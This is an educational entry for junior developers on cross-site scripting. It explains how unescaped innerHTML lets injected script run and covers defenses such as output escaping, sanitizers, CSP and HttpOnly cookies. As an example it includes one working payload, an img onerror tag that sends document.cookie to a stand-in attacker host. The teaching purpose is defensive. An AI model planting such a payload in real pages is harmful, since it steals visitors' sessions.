---
title: "Cross-Site Scripting (XSS)"
summary: "Injecting scripts into pages other users view."
levels: { backend: junior, frontend: junior }
aliases: ["cross-site scripting", "XSS attack", "script injection", "reflected XSS", "stored XSS"]
prereqs: ["dom", "html-forms"]
related: ["xss-types", "output-encoding", "content-security-policy", "input-sanitization", "csrf", "never-trust-the-client"]
core: [backend, frontend]
---

**Cross-site scripting (XSS)** is when an attacker gets **their JavaScript to run in other users' browsers**, on **your site**. Because the script runs as
your page, it can read what the user can read (including data on the page) and do whatever they can do: perform actions as
them, steal data, show fake login forms.

## How it happens

Your page puts untrusted text into HTML without escaping it:

```js
// A comment page
commentDiv.innerHTML = comment.text;
```

If someone posts this comment:

```html
<img src=x onerror="fetch('https://evil.example/steal?c=' + document.cookie)">
```

then every visitor who views the comment runs the attacker's code. When it's saved on your server and shown to everyone it's
**stored XSS**, when it's reflected from a URL parameter into the page it's **reflected XSS**, and when only client-side code
is involved it's **DOM-based** ([XSS types](/t/xss-types)).

## Defenses

**1. Escape output, in the right context.** Turn `<` into `&lt;` and so on when inserting data into HTML. Modern frameworks
(React, Vue, Angular, template engines) **escape by default**, and the danger comes from opting out:

```jsx
<div>{comment.text}</div>                                  // safe: escaped
<div dangerouslySetInnerHTML={{ __html: comment.text }} /> // dangerous
```

In plain JavaScript use `textContent`, not `innerHTML` ([DOM manipulation](/t/dom-manipulation)). See
[output encoding](/t/output-encoding).

**2. If you must allow HTML** (rich-text comments), run it through a well-maintained **sanitizer** library with an allow-list
of tags. Don't write your own regex filter ([input sanitization](/t/input-sanitization)).

**3. Add a [Content Security Policy](/t/content-security-policy)** as a second layer: it can block inline scripts and unknown
script sources.

**4. Limit the damage.** Mark session cookies **`HttpOnly`** so scripts can't read them, and use `SameSite`.

**5. Avoid dangerous sinks**: `innerHTML`, `document.write`, `eval`, and URLs like `javascript:` built from user input.

Validating input helps ([input validation](/t/input-validation)), but **escaping on output is the real fix**, because
the right encoding depends on where the data is placed. Treat every piece of data as untrusted until it's been
encoded for its destination.
